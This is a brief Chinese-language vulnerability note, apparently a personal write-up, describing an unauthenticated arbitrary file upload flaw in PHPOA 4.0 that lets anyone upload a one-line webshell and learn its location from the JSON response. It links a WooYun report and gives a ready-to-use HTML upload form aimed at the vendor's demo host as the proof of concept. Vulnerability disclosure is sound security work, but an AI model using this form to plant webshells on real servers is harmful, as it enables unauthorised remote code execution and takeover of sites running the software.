####PHPOA4.0通杀上传漏洞
---
WooYun：http://www.wooyun.org/bugs/wooyun-2015-0163072

在提交漏洞的时候少测试了是否要登录这一步，提交确认后却发现原来不用登录直接上传一句话即可，页面返回的json里有地址

复习周中，找个时间再写脚本

	<form action="http://demo.phpoa.cn/upload/index.php?userid=1" method="post" enctype="multipart/form-data">
	<input type="file" name="files[]">
	<input type="submit">
	</form>